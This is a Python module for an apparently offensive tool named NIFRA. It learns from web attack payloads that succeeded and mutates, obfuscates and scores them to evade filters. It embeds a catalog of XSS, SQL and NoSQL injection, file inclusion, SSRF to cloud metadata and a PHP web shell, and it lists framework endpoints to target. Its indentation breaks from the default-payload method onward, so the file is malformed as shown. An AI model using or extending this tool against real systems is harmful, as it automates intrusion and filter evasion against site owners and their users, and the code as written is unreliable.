# trainer/payload_optimizer.py
import json
import os
import random
import re
import hashlib
import base64
import logging
import time
import numpy as np
from datetime import datetime, timezone, timedelta
from collections import defaultdict, deque
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.cluster import DBSCAN
from scipy.spatial.distance import cosine

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('NIFRA-PayloadOptimizer')

class PayloadOptimizer:
    """Advanced payload optimizer with ML and adaptive features for NIFRA"""
    
    def __init__(self, memory_file="trainer/memory_buffer.jsonl", 
                 evolution_rate=0.4, 
                 seed=None,
                 forgetting_halflife_days=30,
                 cluster_similarity=0.82,
                 min_cluster_size=2,
                 context_awareness=True):
        """
        Initializes the payload optimizer with advanced settings
        
        Args:
            memory_file: Path to the memory file
            evolution_rate: Payload evolution/mutation rate (0.0-1.0)
            seed: Seed for reproducibility
            forgetting_halflife_days: Days until a payload loses half of its effectiveness
            cluster_similarity: Similarity threshold for clustering (0.0-1.0)
            min_cluster_size: Minimum size to identify a cluster
            context_awareness: Activate context adaptation
        """
        # Configuración básica
        self.memory_file = memory_file
        self.evolution_rate = evolution_rate
        self.seed = seed
        self.forgetting_halflife_days = forgetting_halflife_days
        self.cluster_similarity = cluster_similarity
        self.min_cluster_size = min_cluster_size
        self.context_awareness = context_awareness
        
        if seed is not None:
            random.seed(seed)
            np.random.seed(seed)
            
        # Estructuras de datos principales
        self.successful_payloads = []
        self.framework_payloads = defaultdict(list)
        self.objective_payloads = defaultdict(list)
        self.context_payloads = defaultdict(list) 
        
        # Cache de deduplicación
        self.recent_payloads = deque(maxlen=20) 
        
        # Catálogo de ataques
        self.attack_catalog = self._build_attack_catalog()
        
        # Modelo de clustering para agrupar payloads similares
        self.vectorizer = TfidfVectorizer(
            min_df=1, max_df=0.9, 
            ngram_range=(1, 3),
            analyzer='char_wb'
        )
        self.payload_clusters = []
        self.cluster_representatives = []
        
        # Modelo predictivo básico (se construirá con los datos)
        self.feature_weights = defaultdict(float)
        self.prediction_threshold = 0.5
        
        # Cargar memoria
        self.load_memory()
    
    def _build_attack_catalog(self):
        """Build a simplified catalog of attacks for quick reference"""
        return {
            # Plantillas por tipo de ataque
            "xss": {
                "basic": "<script>alert(1)</script>",
                "img": "<img src=x onerror=alert(document.domain)>",
                "svg": "<svg onload=alert(document.cookie)>",
                "bypass": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>"
            },
            "sqli": {
                "basic": "' OR 1=1--",
                "union": "' UNION SELECT 1,2,3,4,5--",
                "blind": "' AND (SELECT SUBSTR(@@version,1,1)='5')--",
                "error": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"
            },
            "rce": {
                "basic": "system('id');",
                "shell": "`cat /etc/passwd`",
                "php": "<?php system($_GET['cmd']); ?>",
                "backend": ";cat /etc/passwd;"
            },
            "file_inclusion": {
                "basic": "../../../etc/passwd",
                "filter": "php://filter/convert.base64-encode/resource=index.php",
                "data": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
                "bypass": "....//....//....//etc/passwd"
            },
            "ssrf": {
                "basic": "http://localhost:8080/admin",
                "metadata": "http://169.254.169.254/latest/meta-data/",
                "gopher": "gopher://127.0.0.1:25/xHELO%20localhost",
                "file": "file:///etc/passwd"
            },
            "idor": {
                "basic": "/api/users/2",
                "param": "?user_id=admin",
                "array": "?id[]=1&id[]=2",
                "bypass": "/api/../admin/users"
            },
            "auth_bypass": {
                "basic": "admin' OR '1'='1",
                "array": "username[]=admin",
                "nosql": "username[$ne]=dummy&password[$ne]=dummy",
                "json": '{"username":{"$gt":""},"password":{"$gt":""}}'
            },
            # Mutadores por framework
            "wordpress": {
                "urls": ["/wp-json/wp/v2/users", "/wp-admin/admin-ajax.php", "/xmlrpc.php"],
                "params": ["?rest_route=/", "?p=1", "?s="],
                "mutations": ["wp-content", "wp-includes", "wp-admin"]
            },
            "laravel": {
                "urls": ["/api/user", "/_ignition", "/.env"],
                "params": ["?_token=", "?trashed=", "?debug=true"],
                "mutations": ["{{", "}}", "_token"]
            },
            "django": {
                "urls": ["/admin/login/", "/static/", "/media/"],
                "params": ["?csrfmiddlewaretoken=", "?next=", "?debug=true"],
                "mutations": ["csrf", "middleware", "staticfiles"]
            },
            "nextjs": {
                "urls": ["/_next/static/", "/api/", "/.next/"],
                "params": ["?revalidate=1", "?slug=", "?__nextLocale=en"],
                "mutations": ["getServerSideProps", "getStaticProps"]
            }
        }
    
    def _create_context_key(self, task):
        """Create a context key based on the task and domain"""
        if not isinstance(task, dict):
            return "generic"
        
        # Extraer información relevante
        framework = task.get('framework', 'unknown').lower()
        objective = task.get('objective', '').lower()
        url = task.get('url', '')
        
        # Extraer dominio si hay URL
        domain = ""
        if url:
            try:
                from urllib.parse import urlparse
                domain = urlparse(url).netloc
            except:
                pass
        
        # Construir clave de contexto
        if domain:
            return f"{domain}:{framework}:{objective}"
        else:
            return f"{framework}:{objective}"
    
    def _extract_features(self, payload, framework=None, objective=None):
        """Extract features from a payload for prediction and clustering"""
        features = {}
        
        # Características lexicográficas básicas
        features['length'] = len(payload)
        features['special_chars'] = sum(1 for c in payload if not c.isalnum() and not c.isspace())
        features['keywords'] = sum(1 for k in ['script', 'alert', 'select', 'union', 'system', '../'] 
                                if k in payload.lower())
        
        # Características por tipo de ataque
        features['xss_patterns'] = len(re.findall(r'<\s*script|<\s*img|alert\s*\(|on\w+=', payload.lower()))
        features['sqli_patterns'] = len(re.findall(r'select|union|where|from|1=1|--', payload.lower()))
        features['rce_patterns'] = len(re.findall(r'system|exec|shell|cat\s+|\/bin\/', payload.lower()))
        features['lfi_patterns'] = len(re.findall(r'\.\.\/|\/etc\/|php:\/\/|data:\/\/', payload.lower()))
        
        # Características por framework
        if framework == 'wordpress':
            features['wp_patterns'] = len(re.findall(r'wp-|xmlrpc|rest_route', payload.lower()))
        elif framework == 'laravel':
            features['laravel_patterns'] = len(re.findall(r'_token|laravel|\{\{|\}\}', payload.lower()))
        elif framework == 'django':
            features['django_patterns'] = len(re.findall(r'csrf|middleware|static', payload.lower()))
        
        # Características de objetivo
        if objective:
            features['objective_match'] = 1 if objective in payload.lower() else 0
        
        # Características de obfuscación
        features['obfuscation'] = len(re.findall(r'%[0-9a-f]{2}|&#\d+;|\\x[0-9a-f]{2}|\/\*.*?\*\/', payload))
        
        return features
    
    def _hash_payload(self, payload):
        """Generates a hash for a payload"""
        # Normalización básica para hasheo
        normalized = re.sub(r'\s+', ' ', payload.lower()).strip()
        normalized = re.sub(r'/\*.*?\*/', '', normalized)
        normalized = re.sub(r'//.*$', '', normalized, flags=re.MULTILINE)
        return hashlib.md5(normalized.encode()).hexdigest()
    
    def _is_duplicate(self, payload):
        """Checks if a payload is duplicated"""
        payload_hash = self._hash_payload(payload)
        if payload_hash in self.recent_payloads:
            return True
        self.recent_payloads.append(payload_hash)
        return False
    
    def _apply_time_decay(self, score, timestamp_str):
        """Applies temporary decay to scores from old payloads"""
        try:
            # Convertir timestamp a datetime
            timestamp = datetime.fromisoformat(timestamp_str.replace('Z', '+00:00'))
            
            # Calcular días transcurridos
            now = datetime.now(timezone.utc)
            days_passed = (now - timestamp).total_seconds() / (24 * 3600)
            
            # Aplicar decay exponencial
            decay_factor = 0.5 ** (days_passed / self.forgetting_halflife_days)
            
            # Aplicar al score
            return score * decay_factor
        except:
            # En caso de error, aplicar decay conservador
            return score * 0.8
    
    def _cluster_payloads(self):
        """Groups payloads based on technical similarity"""
        if len(self.successful_payloads) < self.min_cluster_size:
            logger.info("Not enough payloads for clustering")
            return []
        
        try:
            # Extraer textos de payloads
            payload_texts = [p['payload'] for p in self.successful_payloads]
            
            # Crear matriz TF-IDF
            X = self.vectorizer.fit_transform(payload_texts)
            
            # Realizar clustering
            db = DBSCAN(
                eps=1.0 - self.cluster_similarity,  # Convertir similitud a distancia
                min_samples=self.min_cluster_size,
                metric='cosine'
            ).fit(X)
            
            # Obtener etiquetas de cluster
            labels = db.labels_
            
            # Organizar en clusters (ignorando ruido: -1)
            clusters = defaultdict(list)
            for i, label in enumerate(labels):
                if label != -1:  # No es ruido
                    clusters[label].append(i)
            
            # Guardar clusters
            self.payload_clusters = [
                [self.successful_payloads[i] for i in indices]
                for label, indices in clusters.items()
            ]
            
            # Encontrar representantes de cada cluster (payload con mejor score)
            self.cluster_representatives = []
            for cluster in self.payload_clusters:
                best_payload = max(cluster, key=lambda p: p.get('score', 0))
                self.cluster_representatives.append(best_payload)
            
            logger.info(f"Found {len(self.payload_clusters)} clusters in {len(self.successful_payloads)} payloads")
            return self.payload_clusters
            
        except Exception as e:
            logger.error(f"Clustering error: {str(e)}")
            return []
    
    def _predict_success_probability(self, payload, framework, objective):
        """Predicts the probability of success of a payload"""
        # Extraer características
        features = self._extract_features(payload, framework, objective)
        
        # Si no hay suficientes datos para el modelo, usar heurística simple
        if sum(self.feature_weights.values()) == 0:
            # Heurística básica
            attack_type = self._get_attack_type(objective, payload)
            if attack_type == 'xss':
                return features['xss_patterns'] * 0.1 + features['special_chars'] * 0.05
            elif attack_type == 'sqli':
                return features['sqli_patterns'] * 0.1 + features['special_chars'] * 0.05
            elif attack_type == 'rce':
                return features['rce_patterns'] * 0.1 + features['special_chars'] * 0.05
            else:
                return 0.5  # Valor predeterminado
        
        # Calcular score ponderado
        score = 0.0
        total_weight = 0.0
        for feat, value in features.items():
            if feat in self.feature_weights:
                weight = self.feature_weights[feat]
                score += value * weight
                total_weight += abs(weight)
        
        # Normalizar
        if total_weight > 0:
            score /= total_weight
            
        # Limitar al rango [0, 1]
        return max(0.0, min(1.0, score))
    
    def _update_prediction_model(self):
        """Updates the prediction model based on existing payloads"""
        if len(self.successful_payloads) < 5:  # Necesitamos suficientes datos
            return
            
        try:
            # Inicializar contadores
            feature_sums = defaultdict(float)
            feature_counts = defaultdict(int)
            
            # Analizar todos los payloads con sus scores
            for payload_entry in self.successful_payloads:
                payload = payload_entry['payload']
                framework = payload_entry['framework']
                objective = payload_entry['objective']
                score = payload_entry['score']
                
                # Extraer características
                features = self._extract_features(payload, framework, objective)
                
                # Acumular para cada característica
                for feat, value in features.items():
                    if value > 0:  # Solo considerar características presentes
                        feature_sums[feat] += score * value
                        feature_counts[feat] += 1
            
            # Calcular pesos promedio
            for feat in feature_sums:
                if feature_counts[feat] > 0:
                    self.feature_weights[feat] = feature_sums[feat] / feature_counts[feat]
            
            # Normalizar pesos
            total = sum(abs(w) for w in self.feature_weights.values())
            if total > 0:
                for feat in self.feature_weights:
                    self.feature_weights[feat] /= total
                    
            logger.info(f"Updated prediction model with {len(self.feature_weights)} features")
            
        except Exception as e:
            logger.error(f"Error updating prediction model: {str(e)}")
    
    def load_memory(self):
        """Loads and parses successful payloads from the memory buffer"""
        if not os.path.exists(self.memory_file):
            logger.warning(f"Memory file {self.memory_file} not found")
            return
        
        try:
            with open(self.memory_file, 'r') as f:
                for line in f:
                    try:
                        entry = json.loads(line)
                        
                        # Extraer información clave
                        payload = entry.get('payload', '')
                        framework = entry.get('framework', 'unknown').lower()
                        status = entry.get('status', 'failed')
                        evaluation = entry.get('evaluation', {})
                        score = evaluation.get('score', 0) if isinstance(evaluation, dict) else 0
                        bypassed = entry.get('bypassed', False)
                        timestamp = entry.get('timestamp', datetime.now(timezone.utc).isoformat())
                        
                        # Extraer objetivo y crear clave de contexto
                        task = entry.get('task', {})
                        objective = task.get('objective', '').lower() if isinstance(task, dict) else ''
                        context_key = self._create_context_key(task)
                        
                        # Calcular fitness básico
                        fitness = score
                        if bypassed:
                            fitness += 0.3
                        
                        # Aumentar si hay indicadores en el resumen
                        if isinstance(evaluation, dict) and "summary" in evaluation:
                            summary = evaluation["summary"].lower()
                            if any(indicator in summary for indicator in 
                                  ["vulnerability", "detected", "successful", "bypassed"]):
                                fitness += 0.1
                        
                        # Aplicar decay temporal
                        fitness = self._apply_time_decay(fitness, timestamp)
                        
                        # Verificar si fue exitoso según varios criterios
                        is_successful = (status == 'success' or bypassed or 
                                        fitness > 0.3 or 
                                        (isinstance(evaluation, dict) and 
                                         evaluation.get('status') == 'SUCCESS'))
                        
                        if is_successful:
                            # Registrar payload con información completa
                            payload_entry = {
                                'payload': payload,
                                'score': fitness,
                                'framework': framework,
                                'objective': objective,
                                'context': context_key,
                                'timestamp': timestamp,
                                'attack_type': self._get_attack_type(objective, payload)
                            }
                            
                            # Evitar duplicados
                            if not self._is_duplicate(payload):
                                self.successful_payloads.append(payload_entry)
                                self.framework_payloads[framework].append(payload_entry)
                                self.objective_payloads[objective].append(payload_entry)
                                
                                # Organizar por contexto si está activado
                                if self.context_awareness:
                                    self.context_payloads[context_key].append(payload_entry)
                    except Exception as e:
                        logger.warning(f"Error processing memory entry: {str(e)}")
                        continue
            
            # Realizar clustering para agrupar payloads similares
            self._cluster_payloads()
            
            # Actualizar modelo de predicción
            self._update_prediction_model()
            
            logger.info(f"Loaded {len(self.successful_payloads)} payloads from memory")
            
        except Exception as e:
            logger.error(f"Error loading memory: {str(e)}")
    
    def _get_attack_type(self, objective, payload):
        """Determines the type of attack based on the target and content of the payload"""
        # Primero intentar derivar del objetivo
        for attack_type in self.attack_catalog:
            if attack_type in objective:
                return attack_type
        
        # Si no, analizar el payload
        indicators = {
            "xss": ["<script", "alert(", "onerror=", "onload="], 
            "sqli": ["SELECT", "UNION", "1=1", "--"],
            "rce": ["system(", "exec(", "shell", "cat /etc"],
            "file_inclusion": ["../", "php://", "file://"],
            "ssrf": ["localhost", "127.0.0.1", "gopher://"],
            "idor": ["/users/", "user_id=", "profile?id="],
            "auth_bypass": ["admin", "password", "login"]
        }
        
        for attack_type, patterns in indicators.items():
            if any(p in payload.lower() for p in patterns):
                return attack_type
                
        # Valor predeterminado
        return "xss"
    
    def _mutate_payload(self, payload, framework, objective):
        """Aggressive payload mutation"""
        # Determinar tipo de ataque
        attack_type = self._get_attack_type(objective, payload)
        
        # Obtener catálogo para este tipo
        attack_templates = self.attack_catalog.get(attack_type, {})
        framework_data = self.attack_catalog.get(framework, {})
        
        # Estrategias de mutación
        strategies = [
            # 1. Reemplazar parte del payload con una plantilla más agresiva
            lambda p: self._inject_template(p, attack_templates),
            
            # 2. Agregar elementos específicos del framework
            lambda p: self._add_framework_specific(p, framework_data),
            
            # 3. Aplicar ofuscación para evadir filtros
            lambda p: self._apply_obfuscation(p),
            
            # 4. Aplicar mutaciones específicas al tipo de ataque
            lambda p: self._apply_attack_specific_mutation(p, attack_type)
        ]
        
        # Aplicar una estrategia aleatoria
        strategy = random.choice(strategies)
        mutated = strategy(payload)
        
        # Evaluar probabilidad de éxito
        success_prob = self._predict_success_probability(mutated, framework, objective)
        
        # Si la probabilidad es baja, intentar otra mutación
        if success_prob < self.prediction_threshold and random.random() < 0.7:
            another_strategy = random.choice(strategies)
            another_mutated = another_strategy(payload)
            another_prob = self._predict_success_probability(another_mutated, framework, objective)
            
            if another_prob > success_prob:
                mutated = another_mutated
                success_prob = another_prob
        
        # Marcar el payload con su probabilidad predicha
        rand_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=4))
        mutated += f'\n/* NIFRA-{rand_id} | P(success)={success_prob:.2f} */'
        
        return mutated
    
    def _inject_template(self, payload, templates):
        """Inject an aggressive template into the payload"""
        if not templates:
            return payload
            
        # Seleccionar plantilla aleatoria
        template_key = random.choice(list(templates.keys()))
        template = templates[template_key]
        
        # Decidir estrategia de inyección
        if random.random() < 0.5 and len(payload) > 20:
            # Insertar en el medio
            mid = len(payload) // 2
            return payload[:mid] + template + payload[mid:]
        else:
            # Concatenar al inicio o final
            return template + "\n" + payload if random.random() < 0.5 else payload + "\n" + template
    
    def _add_framework_specific(self, payload, framework_data):
        """Add framework-specific elements"""
        if not framework_data:
            return payload
            
        modified = payload
        
        # Aplicar elementos aleatorios específicos del framework
        if "urls" in framework_data and random.random() < 0.7:
            url = random.choice(framework_data["urls"])
            if url not in modified:
                modified += f"\n/* Try: {url} */"
                
        if "params" in framework_data and random.random() < 0.6:
            param = random.choice(framework_data["params"])
            if param not in modified:
                modified = modified.replace("?", param + "&") if "?" in modified else modified + param
                
        if "mutations" in framework_data and random.random() < 0.5:
            mutation = random.choice(framework_data["mutations"])
            if mutation not in modified:
                modified = modified.replace("test", mutation)
        
        return modified
    
    def _apply_obfuscation(self, payload):
        """Applies obfuscation techniques to evade filters"""
        techniques = [
            # Cambio aleatorio de mayúsculas/minúsculas
            lambda p: ''.join([c.upper() if random.random() < 0.3 else c.lower() for c in p]),
            
            # Codificación URL parcial
            lambda p: ''.join([f"%{ord(c):02x}" if c.isalpha() and random.random() < 0.2 else c for c in p]),
            
            # Inserción de comentarios en HTML/JS
            lambda p: p.replace("<", "<!----><").replace("=", "=/*!*/") if "<" in p else p,
            
            # Espaciado aleatorio en SQL
            lambda p: p.replace(" ", " "*random.randint(1, 3)) if "SELECT" in p.upper() else p,
            
            # Codificación base64 parcial
            lambda p: p if len(p) < 20 else p[:10] + base64.b64encode(p[10:20].encode()).decode() + p[20:]
        ]
        
        # Aplicar 1-2 técnicas aleatorias
        num_techniques = random.randint(1, 2)
        obfuscated = payload
        
        for _ in range(num_techniques):
            technique = random.choice(techniques)
            obfuscated = technique(obfuscated)
        
        return obfuscated
    
    def _apply_attack_specific_mutation(self, payload, attack_type):
        """Apply specific mutations depending on the type of attack"""
        mutations = {
            "xss": [
                lambda p: p.replace("alert", "confirm"),
                lambda p: p.replace("<script>", "<script>setTimeout(()=>"),
                lambda p: p.replace("</script>", ",100)</script>")
            ],
            "sqli": [
                lambda p: p.replace("1=1", "(SELECT 1)=1"),
                lambda p: p.replace("UNION", "/**/UNION/**/"),
                lambda p: p.replace("--", "#")
            ],
            "rce": [
                lambda p: p.replace("system", "passthru"),
                lambda p: p.replace(";", "&&"),
                lambda p: p.replace("/bin/sh", "/bin/bash")
            ],
            "file_inclusion": [
                lambda p: p.replace("../", "..././"),
                lambda p: p.replace("../", "%2e%2e/"),
                lambda p: p.replace("/etc/", "/proc/self/")
            ],
            "ssrf": [
                lambda p: p.replace("localhost", "127.0.0.1"),
                lambda p: p.replace("http://", "gopher://"),
                lambda p: p.replace("127.0.0.1", "[::1]")
            ],
            "idor": [
                lambda p: p.replace("id=1", "id[]=1"),
                lambda p: p.replace("/1", "/%31"),
                lambda p: p.replace("user_id", "account_id")
            ],
            "auth_bypass": [
                lambda p: p.replace("' OR '", "' OR true; --"),
                lambda p: p.replace("admin", "ADMIN"),
                lambda p: p.replace("password=", "password[$ne]=")
            ]
        }
        
        if attack_type in mutations:
            mutation = random.choice(mutations[attack_type])
            return mutation(payload)
        
        return payload
    
    def _enhance_baseline(self, baseline, framework, objective):
        """Enhances a base payload with elements specific to the framework and target"""
        if not baseline or len(baseline) < 10:
            return self._generate_default_payload(framework, objective)
        
        attack_type = self._get_attack_type(objective, baseline)
        
        # Obtener plantillas relevantes
        attack_templates = self.attack_catalog.get(attack_type, {})
        framework_data = self.attack_catalog.get(framework, {})
        
        # Mejorar con plantilla específica al ataque
        if attack_templates and random.random() < 0.6:
            template_key = random.choice(list(attack_templates.keys()))
            template = attack_templates[template_key]
            if template not in baseline:
                baseline += f"\n\n// Try: {template}"
        
        # Agregar pistas para el framework
        if framework_data and "urls" in framework_data and random.random() < 0.7:
            urls = framework_data["urls"]
            selected_urls = random.sample(urls, min(2, len(urls)))
            baseline += "\n\n// Framework targets:"
            for url in selected_urls:
                baseline += f"\n// {url}"
        
        # Evaluar probabilidad de éxito
        success_prob = self._predict_success_probability(baseline, framework, objective)
        
        # Randomizar para hacerlo único
        rand_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=5))
        baseline += f"\n\n// Enhanced-{rand_id} | P(success)={success_prob:.2f}"
        
        return baseline
    
    def _generate_default_payload(self, framework, objective):
           """Generates an aggressive default payload based on framework and target"""
       attack_type = next((a for a in self.attack_catalog if a in objective), "xss")
       
       # Obtener plantillas
       attack_templates = self.attack_catalog.get(attack_type, {})
       framework_data = self.attack_catalog.get(framework, {})
       
       # Construir payload agresivo combinando múltiples plantillas
       payload = ""
       
       # Agregar plantillas de ataque
       if attack_templates:
           # Usar 2-3 plantillas del tipo de ataque
           selected_keys = random.sample(list(attack_templates.keys()), 
                                        min(random.randint(2, 3), len(attack_templates)))
           payload = "\n".join([attack_templates[k] for k in selected_keys])
       
       # Agregar referencias al framework
       if framework_data:
           # Agregar objetivos específicos del framework
           if "urls" in framework_data:
               payload += "\n\n// Framework targets:"
               for url in random.sample(framework_data["urls"], min(2, len(framework_data["urls"]))):
                   payload += f"\n// {url}"
           
           # Incluir parámetros específicos del framework
           if "params" in framework_data and framework_data["params"]:
               param = random.choice(framework_data["params"])
               if "?" not in payload:
                   payload += f"\n\n// Try with: {param}"
       
       # Evaluar probabilidad de éxito
       success_prob = self._predict_success_probability(payload, framework, objective)
       
       # Identificador único
       rand_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=5))
       payload += f"\n\n// Default-{rand_id} | P(success)={success_prob:.2f}"
       
       return payload
   
   def get_optimized_payload(self, task, baseline_payload):
       """
       Generates an optimized payload based on the task and learning history
       
       Args:
           task (dict): Task with information about the framework, objective, etc..
           baseline_payload (str): Base payload to optimize
           
       Returns:
           str: Optimized payload
       """
       framework = task.get('framework', 'unknown').lower() if isinstance(task, dict) else 'unknown'
       objective = task.get('objective', '').lower() if isinstance(task, dict) else ''
       context_key = self._create_context_key(task) if self.context_awareness else None
       
       start_time = time.time()
       logger.info(f"Optimizing payload for framework: {framework}, objective: {objective}")
       
       # Seleccionar candidatos en función del contexto si está habilitado
       candidates = []
       
       # 1. Intentar primero por contexto específico
       if self.context_awareness and context_key and context_key in self.context_payloads:
           context_payloads = self.context_payloads[context_key]
           if context_payloads:
               # Seleccionar los mejores candidatos de contexto
               candidates = sorted(context_payloads, key=lambda x: x.get('score', 0), reverse=True)[:3]
               logger.info(f"Found {len(candidates)} context-specific candidates")
       
       # 2. Intentar por clusters similares si hay disponibles
       if not candidates and self.cluster_representatives:
           # Encontrar cluster más relevante
           if self.vectorizer.vocabulary_:
               try:
                   # Vectorizar payload base
                   baseline_vec = self.vectorizer.transform([baseline_payload])
                   
                   # Vectorizar representantes de cluster
                   rep_payloads = [p['payload'] for p in self.cluster_representatives]
                   rep_vecs = self.vectorizer.transform(rep_payloads)
                   
                   # Calcular similaridades
                   similarities = []
                   for i, rep_vec in enumerate(rep_vecs):
                       sim = 1 - cosine(baseline_vec.toarray()[0], rep_vec.toarray()[0])
                       similarities.append((i, sim))
                   
                   # Ordenar por similitud
                   similarities.sort(key=lambda x: x[1], reverse=True)
                   
                   # Tomar los mejores representantes
                   for idx, sim in similarities[:2]:
                       if sim > 0.5:  # Umbral mínimo de similitud
                           candidates.append(self.cluster_representatives[idx])
                           
                   if candidates:
                       logger.info(f"Found {len(candidates)} candidates from similar clusters")
               except Exception as e:
                   logger.warning(f"Error finding similar clusters: {str(e)}")
       
       # 3. Buscar coincidencias por objetivo y framework específico
       if len(candidates) < 3:
           objective_matches = [p for p in self.objective_payloads.get(objective, []) 
                             if p.get('framework') == framework]
           
           if objective_matches:
               top_matches = sorted(objective_matches, key=lambda x: x.get('score', 0), reverse=True)[:3]
               for match in top_matches:
                   if match not in candidates:
                       candidates.append(match)
                       
               logger.info(f"Added {len(top_matches)} candidates from objective-framework match")
       
       # 4. Añadir coincidencias basadas solo en framework
       if len(candidates) < 3 and framework in self.framework_payloads:
           top_framework = sorted(self.framework_payloads[framework], 
                                key=lambda x: x.get('score', 0), 
                                reverse=True)[:2]
           
           for match in top_framework:
               if match not in candidates:
                   candidates.append(match)
                   
           logger.info(f"Added {len(top_framework)} candidates from framework match")
       
       # Si no hay candidatos suficientes, usar payloads generales
       if len(candidates) < 2 and self.successful_payloads:
           general_best = sorted(self.successful_payloads, 
                               key=lambda x: x.get('score', 0),
                               reverse=True)[:2]
           
           for match in general_best:
               if match not in candidates:
                   candidates.append(match)
                   
           logger.info(f"Added {len(general_best)} candidates from general payloads")
       
       # Si hay candidatos, elegir el mejor para optimizar
       if candidates:
           # Calcular probabilidades de éxito para cada candidato
           for i, candidate in enumerate(candidates):
               payload = candidate['payload']
               prob = self._predict_success_probability(payload, framework, objective)
               candidates[i]['predicted_prob'] = prob
           
           # Ordenar por probabilidad de éxito
           candidates.sort(key=lambda x: x.get('predicted_prob', 0), reverse=True)
           
           # Elegir candidato - con pequeña probabilidad de no elegir el mejor
           # para favorecer exploración
           index = 0
           if len(candidates) > 1 and random.random() < 0.2:
               index = random.randint(0, min(2, len(candidates)-1))
           
           best_candidate = candidates[index]
           
           # Decidir si mutar o usar directamente
           if random.random() < self.evolution_rate:
               # Evolución (mutación agresiva)
               final_payload = self._mutate_payload(best_candidate['payload'], framework, objective)
               logger.info(f"Generated mutated payload from candidate (score={best_candidate.get('score', 0):.2f})")
           else:
               # Pequeñas modificaciones para evitar repetir exactamente
               final_payload = self._apply_obfuscation(best_candidate['payload'])
               logger.info(f"Applied light obfuscation to candidate (score={best_candidate.get('score', 0):.2f})")
           
           # Verificar si es duplicado
           if self._is_duplicate(final_payload):
               # Si es duplicado, forzar una mutación más agresiva
               final_payload = self._mutate_payload(best_candidate['payload'], framework, objective)
               logger.info("Forced mutation to avoid duplicate")
       else:
           # Si no hay candidatos, mejorar el payload base
           final_payload = self._enhance_baseline(baseline_payload, framework, objective)
           logger.info("Enhanced baseline payload (no suitable candidates found)")
       
       elapsed = time.time() - start_time
       logger.info(f"Payload optimization completed in {elapsed:.2f}s")
       
       return final_payload
       
   def get_stats(self):
       """Returns optimizer statistics"""
       return {
           "successful_payloads": len(self.successful_payloads),
           "frameworks": dict([(k, len(v)) for k, v in self.framework_payloads.items()]),
           "objectives": dict([(k, len(v)) for k, v in self.objective_payloads.items()]),
           "clusters": len(self.payload_clusters),
           "features": len(self.feature_weights),
           "top_features": dict(sorted(self.feature_weights.items(), key=lambda x: abs(x[1]), reverse=True)[:5]),
           "contexts": len(self.context_payloads) if self.context_awareness else 0
       }
